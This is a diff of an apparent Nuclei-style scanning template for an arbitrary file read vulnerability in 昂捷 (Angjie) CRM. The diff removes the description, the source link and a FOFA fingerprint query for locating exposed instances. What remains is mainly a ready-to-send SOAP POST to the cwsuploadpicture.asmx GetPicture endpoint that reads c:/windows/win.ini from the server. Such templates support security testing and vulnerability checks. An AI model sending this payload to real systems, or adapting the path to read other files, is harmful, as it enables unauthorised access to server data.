@@ -3,12 +3,8 @@ info:
   name: 昂捷CRM Cwsuploadpicture任意文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/aqqga3dm2gy2qwgn'
+  description: ''
   tags: file-upload,lfi,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: aqqga3dm2gy2qwgn
-    fofa: '"HisModules/ErpAdmin/RoleMng/Js/selectDefaultRole.js"||body="var _FactoryData" || body="/ClientBin/slEnjoy.App.xap"'
 http:
 - raw:
   - "POST /enjoyRMIS_WS/WS/Common/cwsuploadpicture.asmx HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36\nContent-Type: text/xml; charset=utf-8\nContent-Length: 380\nSOAPAction: \"http://tempuri.org/GetPicture\"\n\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\n  <soap:Body>\n    <GetPicture xmlns=\"http://tempuri.org/\">\n      <sFullFileName>c:/windows/win.ini</sFullFileName>\n    </GetPicture>\n  </soap:Body>\n</soap:Envelope>"
